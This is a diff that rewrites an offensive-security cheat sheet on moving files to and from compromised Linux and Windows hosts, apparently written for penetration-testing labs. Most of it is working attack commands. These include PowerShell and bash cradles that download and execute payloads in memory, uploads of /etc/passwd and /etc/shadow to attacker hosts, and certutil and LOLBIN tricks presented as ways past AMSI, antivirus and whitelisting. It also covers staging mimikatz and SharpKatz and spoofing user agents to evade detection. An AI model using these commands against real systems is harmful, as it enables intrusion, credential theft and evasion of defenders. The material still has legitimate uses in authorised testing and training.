@@ -1,316 +1,308 @@
-# Transfering Files
+# Transferring Files
 
-## Netcat File Transfer
+## Validating File Transfers
 
-* Step 1
-* Create a file on the target box in the /tmp directory
+After transferring a file, confirm type and integrity:
 
-```
-touch file.txt
-```
+```bash
+# Linux — check file type
+file shell
+# e.g. shell: ELF 64-bit LSB executable, x86-64 ...
 
-* Set up the listener and direct STDOUT into the new file
+# Linux — MD5 hash
+md5sum shell
 
-```
-nc -nlvp 1234 > file.txt
-```
-
-\-Send the file
-
-```
-nc [target box ip] 1234 < file-to-be-transfered.txt
+# Windows — MD5 hash
+Get-FileHash C:\Users\Public\file.exe -Algorithm MD5
 ```
 
-#### Method Two
+Hashes must match on both sides; if not, re-transfer.
 
-* On attacker run:
+---
 
-```
-nc -lvp 443> transfer.txt
-```
+## Web Servers (Attacker-Hosted)
 
-* On target run:
+### Python
 
-```
-cat transfer.txt | nc $attackerip 443
-```
-
-### NC Transfer with gzip data
-
-```
-//on target machine 
-nc -nvlp 10000 | gzip -d > .y
-//local machine 
-cat ~/tools/static-binaries/socat/socat | gzip -c - | nc 127.0.0.1 10000
-// check md5 hashes match on both systems
-```
-
-## Web Servers:
-
-### Python HTTP Server File Transfer
-
-* Start the Python Server in the directory where the file is located that you want to transfer
-* Use the ip address assigned to your box, if there is a vpn involved use the vpn address
-
-```
-python3 -m http.server
-```
-
-* Above is for python3
-
-```
-python -m SimpleHTTPServer 8000
-```
-
-* Above is for python
-* You can optionally specify a port that you want the server to run on (it defaults to 8000)
-
-```
+```bash
 python3 -m http.server 80
+python2.7 -m SimpleHTTPServer 8000
 ```
 
-* Wget the file from the target box
+### PHP
 
-```
-wget http://172.16.6.1:8000/linpeas.sh
-```
-
-* Change permissions
-
-```
-chmod +x linpeas.sh
+```bash
+php -S 0.0.0.0:8000
 ```
 
-* Run the transfered file
+### Ruby
 
-```
-./linpeas.sh
-```
-
-### PHP Web Server
-
-```
-php -S $ip:80
+```bash
+ruby -run -ehttpd . -p8000
 ```
 
-### Metasploit Web Server
+### Python Upload Server
 
-```
-use auxiliary/server/ftp
-auxiliary/server/tftp
-```
-
-## SMB File Transfer
-
-* On kali box:
-
-```
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+```bash
+pip3 install uploadserver
+python3 -m uploadserver
+# Upload page at /upload on port 8000
 ```
 
-* On Windows (update the IP address with your Kali IP):
+With HTTPS (self-signed cert):
 
-```
-copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
-#Reverse Copy FROM Windows
-copy output.txt \\10.10.14.22\kali\output.txt
-```
-
-#### SMB2 Support
-
-* If you recieve this error when attempting to transfer files:
-
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-* Restart your smbserver.py with this option at the end:
-
-```
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2support
+```bash
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 ```
 
-## Wget
+### Nginx PUT Upload Server
 
-```
-wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh	Download a file using Wget
-```
-
-## Curl
-
-```
-curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh	Download a file using cURL
-```
-
-## PHP Download
-
-```
-php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'	
+```nginx
+# /etc/nginx/sites-available/upload.conf
+server {
+    listen 9001;
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
 ```
 
-## Secure Copy Protocol
+```bash
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+sudo rm /etc/nginx/sites-enabled/default    # if port 80 conflict
+sudo systemctl restart nginx.service
 
-* SCP a file from your attack box to a target box
-
-```
-scp /home/kali/Documents/linpeas.sh user@10.10.10.100:/tmp
-```
-
-* This command copies the file linpeas.sh to user on the target box and places it in the /tmp directory.
-* SCP a file from your attack box while on the command line of a target box and place it in your present working directory.
-
-```
-scp jack@172.16.6.1:/home/kali/Documents/linpeas.sh .
+# Upload with curl
+curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
 ```
 
-#### SCP More Example Usage
+---
 
-* Upload a file using SCP
+## Downloads — Linux
 
-```
-scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip	
-```
+### wget
 
-* Download a file using SCP
-
-```
-scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe	
+```bash
+wget https://example.com/LinEnum.sh -O /tmp/LinEnum.sh
 ```
 
-## Windows Specific Downloads
+### curl
 
-### CertUtil.exe
-
-* Windows has a built-in command line program called CertUtil.exe which is installed as part of Certificate Services and can be used to manage certificates in Windows.
-* CertUtil is also known as living off land LOL binary which is a trusted preinstalled system tool.
-* It can even bypass security features by base64 encoding the malware.
-
-```
-certutil -urlcache -split -f [url] [filename.extension]
-certutil -urlcache -f [url] [filename.extension] [filename.extension]
+```bash
+curl -o /tmp/LinEnum.sh https://example.com/LinEnum.sh
 ```
 
-* `-urlcache` Displays or deletes URL cache entries
-* `-f` Forces fetching a specific URL and updating the cache
-* `-split` Split embedded ASN.1 elements, and saves files on disk
-* Using the encoding may help bypass security controls in certutil.
-* Using the `-decode` option we can download a Base-64 encoded malicious executable such as a text file and decode the executable to disk.
-* This can bypass antivirus, edge devices and filtering.
-* First we need to base64 encode the netcat executable.
+### Fileless (pipe to interpreter)
 
-```
-certutil.exe -encode [inputfilename] [encoded output filename]
+```bash
+curl https://example.com/LinEnum.sh | bash
+wget -qO- https://example.com/script.py | python3
 ```
 
-* To verify that the nc.txt file contains text, we can run the following command to print the first 10 lines to the terminal:
+### Bash /dev/tcp (no curl/wget needed)
 
-```
-powershell -command "Get-Content nc.txt -Head 10"
-```
+Requires Bash 2.04+ compiled with `--enable-net-redirections`.
 
-* Now we have to transfer the text file to the target and decode it back to an executable.
-
-```
-certutil.exe -urlcache -split -f "http://[attack box ip]/nc.txt" nc.txt
+```bash
+exec 3<>/dev/tcp/10.10.10.32/80
+echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+cat <&3
 ```
 
-* And the following command decodes the base64
+### Base64 (no network needed)
 
+On attacker:
+
+```bash
+cat filetoupload | base64 -w 0; echo
 ```
+
+On target:
+
+```bash
+echo '<base64 string>' | base64 -d > filetoupload
+```
+
+---
+
+## Downloads — Windows
+
+### PowerShell — Net.WebClient
+
+```powershell
+# Download to disk
+(New-Object Net.WebClient).DownloadFile('http://10.10.10.32/nc.exe','C:\Users\Public\nc.exe')
+
+# Async variant
+(New-Object Net.WebClient).DownloadFileAsync('http://10.10.10.32/nc.exe','C:\Users\Public\nc.exe')
+
+# Fileless — download string and execute in memory
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.32/PowerView.ps1')
+
+# Pipeline variant
+(New-Object Net.WebClient).DownloadString('http://10.10.10.32/PowerView.ps1') | IEX
+```
+
+### PowerShell — Invoke-WebRequest
+
+Available in PowerShell 3.0+. Slower than Net.WebClient for large files. Aliases: `iwr`, `curl`, `wget`.
+
+```powershell
+Invoke-WebRequest http://10.10.10.32/PowerView.ps1 -OutFile PowerView.ps1
+```
+
+**Common errors:**
+
+IE first-launch not completed — add `-UseBasicParsing`:
+
+```powershell
+Invoke-WebRequest http://10.10.10.32/PowerView.ps1 -UseBasicParsing | IEX
+```
+
+SSL/TLS untrusted certificate:
+
+```powershell
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+```
+
+### PowerShell — Start-BitsTransfer
+
+BITS must be enabled on the target.
+
+```powershell
+Import-Module BitsTransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+
+### Bitsadmin (CLI)
+
+```cmd
+bitsadmin /transfer wcb /priority foreground http://10.10.10.32:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+```
+
+### CertUtil
+
+AMSI may flag this — consider base64 encoding to bypass.
+
+```cmd
+certutil.exe -urlcache -split -f http://10.10.10.32/nc.exe nc.exe
+certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
+```
+
+Base64 encode/decode with CertUtil:
+
+```cmd
+certutil.exe -encode nc.exe nc.txt
+certutil.exe -urlcache -split -f "http://10.10.10.32/nc.txt" nc.txt
 certutil.exe -decode nc.txt nc.exe
 ```
 
-### Powershell downloads:System.Net.WebClient
+### PowerShell Base64 Decode (no network)
 
-* First example uses .NET class System.Net.WebClient.
-* The following commands create a Powershell script on the remote Windows machine that can be used to download the file from the attack box:
+On attacker (Linux):
 
-```
-echo $webclient = New-Object System.Net.WebClient > httpdownload.ps1
-echo $webclient.DownloadFile("[Download URL]","[File Name]") >> httpdownload.ps1
-```
-
-* Note that you have to insert the download link and filename in the command on the last line and replace all the bold with the URL and the filename.
-* Once verified that the PS script is created we can execute with:
-
-```
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File httpdownload.ps1
+```bash
+md5sum id_rsa
+cat id_rsa | base64 -w 0; echo
 ```
 
-* Alternatively we can also execute the command from a regular command line in Windows powershell to download files without creating a script
+On target (Windows):
 
-```
-powershell -c "(new-object System.Net.WebClient).DownloadFile('[Download URL]','[File Name]')"
-```
-
-* The -c option executes the command provided within the double quotes with Powershell.
-
-```
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.3.1/nc.exe','nc.exe')"
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64 string>"))
+Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
 ```
 
-* The default execution policy is ‘Restricted’ which means the system will not run Powershell scripts.
-* With the following powershell command we can get the current execution policy:
+**Note:** cmd.exe has an 8,191 character max string length. Web shells may also error on very large strings.
 
-```
-Get-ExecutionPolicy
-```
+### Proxy-Aware PowerShell Downloader
 
-* We can now set the policy to ‘Unrestricted’:
-
-```
-Set-ExecutionPolicy Unrestricted
-```
-
-### Loading Script into Memory with powershell
-
-* The script can be loaded into memory with powershell&#x20;
-
-```
-powershell.exe -nop -ep bypass (new-object system.net.webclient).downloadstring('http://10.10.15.49/PowerView.ps1') | IEX
-#or 
-(new-object system.net.webclient).downloadstring('http://10.10.15.49/PowerView.ps1') | IEX
-```
-
-### Powershell Downloads: Start-BitsTransfer
-
-* Another way to download files with Powershell is by using the Background Intelligent Transfer Service (BITS).
-* The Start-BitsTransfer cmdlet creates a BITS transfer job to transfer one or more files between a client computer and a server.
-* BITS has to be enabled on the target machine in order for it to work.
-* The following command will download nc.exe from a remote web server to the C drive:
-
-```
-powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://[attack box ip]/nc.exe -Destination C:\
-```
-
-### Powershell Downloads: Invoke-WebRequest
-
-* The Invoke-WebRequest cmdlet is simple and easy to use and is available in Powershell version 3.0 and higher.
-* Downloading large files with this method may cause memory issues.
-* Recommended to use the System.Net.Web.Client method for transferring large files.
-
-```
-powershell Invoke-WebRequest -Uri http://[ip attack box]/nc.exe -OutFile C:\nc.exe
-```
-
-* For this cmdlet to work the target host needs to have at least Powershell 3.0
-* You can check the version of Powershell by using the following command
-
-```
-powershell $PSVersionTable.PsVersion
-```
-
-### Proxy Aware Powershell Downloader&#x20;
-
-```
+```powershell
 $w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("<url>")
 ```
 
-* **Description:** _'Most large orgs are using web proxies these days. The standard PowerShell download cradle is not proxy aware. Use this one.'_
+---
 
-### **Upload Windows data through HTTP Post request**
+## Uploads — Linux to Attacker
 
-make /var/www/upload.php on kali
+### curl to Python uploadserver
 
+```bash
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
+
+### Python3 upload one-liner
+
+```bash
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+### SCP upload
+
+```bash
+scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+```
+
+### Web server on compromised host (reverse download)
+
+Start a web server on the compromised machine and download from attacker:
+
+```bash
+python3 -m http.server 8000   # on target
+wget 192.168.49.128:8000/filetotransfer.txt   # on attacker
+```
+
+---
+
+## Uploads — Windows to Attacker
+
+### PowerShell Base64 Encode (no network)
+
+On target (Windows):
+
+```powershell
+[Convert]::ToBase64String((Get-Content -Path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5
+```
+
+On attacker (Linux):
+
+```bash
+echo '<base64>' | base64 -d > hosts
+md5sum hosts
+```
+
+### PowerShell — PSUpload.ps1 to uploadserver
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+```
+
+### PowerShell Base64 POST to Netcat
+
+```powershell
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+```
+
+On attacker:
+
+```bash
+nc -lvnp 8000
+# Capture base64 from POST body, then:
+echo '<base64>' | base64 -d -w 0 > hosts
+```
+
+### PowerShell — UploadFile to PHP receiver
+
+On attacker, create `/var/www/upload.php`:
+
+```php
 <?php
 $uploaddir = '/var/www/';
 $uploadfile = $uploaddir . $_FILES['file']['name'];
@@ -318,76 +310,390 @@ move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
 ?>
 ```
 
-Upload file in Windows client
+On target:
 
-```
-powershell (New-Object System.Net.WebClient).UploadFile('http://<IP>/upload.php', '<FILE>')
-```
-
-### **VBS download files for Windows XP**
-
-Create vbs script
-
-```
-echo strUrl = WScript.Arguments.Item(0) > wget.vbs
-echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
-echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
-echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
-echo Err.Clear >> wget.vbs
-echo Set http = Nothing >> wget.vbs
-echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
-echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
-echo http.Open "GET", strURL, False >> wget.vbs
-echo http.Send >> wget.vbs
-echo varByteArray = http.ResponseBody >> wget.vbs
-echo Set http = Nothing >> wget.vbs
-echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
-echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
-echo strData = "" >> wget.vbs
-echo strBuffer = "" >> wget.vbs
-echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
-echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
-echo Next >> wget.vbs
-echo ts.Close >> wget.vbs
+```powershell
+(New-Object System.Net.WebClient).UploadFile('http://10.10.10.32/upload.php', 'C:\file.txt')
 ```
 
-Run VBS script to download file
+### CertReq.exe Upload (LOLBIN)
 
-```
-cscript wget.vbs http://<IP>/<FILE> <FILE>
-```
-
-## I am Stuck
-
-* If u ever happen to have a shell of a UNIX system, and cannot find a way to upload anything, this is a lifesaver trick you can try:
-* On local system:
-
-```
-cat filetoupload | base64 -w 0; echo
+```cmd
+certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
 ```
 
-* Double click on output to copy
-* On Target System:
+Catch on attacker with `nc -lvnp 8000`.
 
-```
-echo <copiedContent> | base64 -d > filetoupload
-```
+---
 
-## Validating file transfers
+## SMB Transfers
 
-After transferring a file (e.g. via base64 or HTTP), confirm type and integrity:
+### Impacket SMB Server
 
 ```bash
-# Check file type on target
-file shell
-# e.g. shell: ELF 64-bit LSB executable, x86_64 ...
+# Basic
+sudo impacket-smbserver share -smb2support /tmp/smbshare
 
-# Compare hashes (run on both attacker and target)
-md5sum shell
-# Hashes must match; if not, re-transfer.
+# With authentication (for newer Windows that block guest access)
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+
+### Windows — Copy from SMB
+
+```cmd
+copy \\10.10.10.32\share\nc.exe
+```
+
+If "unauthenticated guest access" is blocked, mount with credentials:
+
+```cmd
+net use n: \\10.10.10.32\share /user:test test
+copy n:\nc.exe
+```
+
+### Windows — Copy to SMB (upload)
+
+```cmd
+copy C:\Users\john\Desktop\output.txt \\10.10.14.22\share\output.txt
+```
+
+### SMB over HTTP (WebDav)
+
+When SMB (TCP/445) is blocked outbound, WebDav works over HTTP/HTTPS. Windows will fall back to HTTP if SMB fails.
+
+```bash
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+
+On Windows:
+
+```cmd
+dir \\192.168.49.128\DavWWWRoot
+copy C:\file.txt \\192.168.49.128\DavWWWRoot\
+copy C:\file.txt \\192.168.49.128\sharefolder\
+```
+
+`DavWWWRoot` is a special Windows Shell keyword for the WebDav root — no such folder exists on the server.
+
+---
+
+## FTP Transfers
+
+### Python FTP Server
+
+```bash
+sudo pip3 install pyftpdlib
+
+# Download server (anonymous, read-only)
+sudo python3 -m pyftpdlib --port 21
+
+# Upload server (anonymous, write-enabled)
+sudo python3 -m pyftpdlib --port 21 --write
+```
+
+### PowerShell FTP Download
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+```
+
+### PowerShell FTP Upload
+
+```powershell
+(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+
+### FTP Command File (non-interactive shell)
+
+Download:
+
+```cmd
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo GET file.txt >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+```
+
+Upload:
+
+```cmd
+echo open 192.168.49.128 > ftpcommand.txt
+echo USER anonymous >> ftpcommand.txt
+echo binary >> ftpcommand.txt
+echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+echo bye >> ftpcommand.txt
+ftp -v -n -s:ftpcommand.txt
+```
+
+---
+
+## Netcat / Ncat
+
+### Target listens, attacker sends
+
+```bash
+# Target (receiver)
+nc -l -p 8000 > SharpKatz.exe       # Original Netcat
+ncat -l -p 8000 --recv-only > SharpKatz.exe   # Ncat
+
+# Attacker (sender)
+nc -q 0 192.168.49.128 8000 < SharpKatz.exe       # Original Netcat
+ncat --send-only 192.168.49.128 8000 < SharpKatz.exe   # Ncat
+```
+
+### Attacker listens, target connects (firewall bypass)
+
+```bash
+# Attacker (sender, listening)
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
+
+# Target (receiver, connecting)
+nc 192.168.49.128 443 > SharpKatz.exe
+ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+```
+
+### Bash /dev/tcp as Netcat alternative
+
+If nc/ncat are not available on the target:
+
+```bash
+cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
+
+### NC with gzip compression
+
+```bash
+# Target (receiver)
+nc -nvlp 10000 | gzip -d > binary
+
+# Attacker (sender)
+cat binary | gzip -c - | nc 10.10.10.32 10000
+```
+
+---
+
+## SCP (SSH)
+
+```bash
+# Enable SSH on attacker
+sudo systemctl enable ssh && sudo systemctl start ssh
+
+# Download from remote to local
+scp user@10.10.10.32:/root/file.txt .
+
+# Upload from local to remote
+scp /home/kali/linpeas.sh user@10.10.10.100:/tmp
+
+# From target, pull from attacker
+scp kali@172.16.6.1:/home/kali/Documents/linpeas.sh .
+```
+
+---
+
+## PowerShell Remoting (WinRM)
+
+TCP/5985 (HTTP) or TCP/5986 (HTTPS). Requires admin access or `Remote Management Users` group.
+
+```powershell
+# Test connectivity
+Test-NetConnection -ComputerName DATABASE01 -Port 5985
+
+# Create session
+$Session = New-PSSession -ComputerName DATABASE01
+
+# Copy file TO remote machine
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+
+# Copy file FROM remote machine
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+---
+
+## RDP File Transfer
+
+### Mount local folder via xfreerdp/rdesktop
+
+```bash
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+```
+
+Access the mounted drive on the remote machine at `\\tsclient\linux`. Not accessible to other users on the target.
+
+---
+
+## Transferring Files with Code
+
+### Python
+
+```bash
+# Python 2 download
+python2.7 -c 'import urllib;urllib.urlretrieve("http://10.10.10.32/LinEnum.sh", "LinEnum.sh")'
+
+# Python 3 download
+python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.10.32/LinEnum.sh", "LinEnum.sh")'
+
+# Python 3 upload
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+
+### PHP
+
+```bash
+# file_get_contents
+php -r '$file = file_get_contents("http://10.10.10.32/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+
+# fopen (buffered)
+php -r 'const BUFFER = 1024; $fremote = fopen("http://10.10.10.32/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+# Fileless (pipe to bash)
+php -r '$lines = @file("http://10.10.10.32/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+```
+
+### Ruby
+
+```bash
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("http://10.10.10.32/LinEnum.sh")))'
+```
+
+### Perl
+
+```bash
+perl -e 'use LWP::Simple; getstore("http://10.10.10.32/LinEnum.sh", "LinEnum.sh");'
+```
+
+### JavaScript (Windows — cscript.exe)
+
+Save as `wget.js`:
+
+```javascript
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+
+```cmd
+cscript.exe /nologo wget.js http://10.10.10.32/PowerView.ps1 PowerView.ps1
+```
+
+### VBScript (Windows — cscript.exe)
+
+Save as `wget.vbs`:
+
+```vbscript
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+
+```cmd
+cscript.exe /nologo wget.vbs http://10.10.10.32/PowerView.ps1 PowerView.ps1
+```
+
+---
+
+## Living off the Land (LOLBAS / GTFOBins)
+
+- [LOLBAS Project (Windows)](https://lolbas-project.github.io) — search `/download` or `/upload`
+- [GTFOBins (Linux)](https://gtfobins.github.io/) — search `+file download` or `+file upload`
+
+### OpenSSL Encrypted Transfer (GTFOBin)
+
+```bash
+# Attacker — generate cert and serve file
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+
+# Target — download file
+openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+
+### GfxDownloadWrapper.exe (LOLBIN)
+
+Intel Graphics Driver binary — may bypass application whitelisting:
+
+```powershell
+GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
+
+---
+
+## Protected File Transfers
+
+### Windows — AES Encryption (PowerShell)
+
+Using [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1):
+
+```powershell
+Import-Module .\Invoke-AESEncryption.ps1
+
+# Encrypt
+Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+# Produces scan-results.txt.aes
+
+# Decrypt
+Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes
+```
+
+### Linux — OpenSSL Encryption
+
+```bash
+# Encrypt
+openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+
+# Decrypt
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+```
+
+Use a strong unique password per engagement.
+
+---
+
+## Detection & Evasion
+
+### User Agent Signatures
+
+Each transfer method has a distinct UA string. Defenders can whitelist/blacklist these:
+
+| Method | User-Agent |
+|---|---|
+| Invoke-WebRequest | `Mozilla/5.0 (Windows NT; ...) WindowsPowerShell/5.1.14393.0` |
+| WinHttp.WinHttpRequest.5.1 | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` |
+| Msxml2.XMLHTTP | `Mozilla/4.0 (compatible; MSIE 7.0; ...)` |
+| CertUtil | `Microsoft-CryptoAPI/10.0` |
+| BITS | `Microsoft BITS/7.8` |
+
+### Changing User Agent
+
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+
+### Alternative COM Download Objects (PowerShell)
+
+```powershell
+# WinHttpRequest
+$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.32/nc.exe',$false);$h.send();iex $h.ResponseText
+
+# Msxml2.XMLHTTP
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.10.32/nc.exe',$false);$h.send();iex $h.responseText
 ```
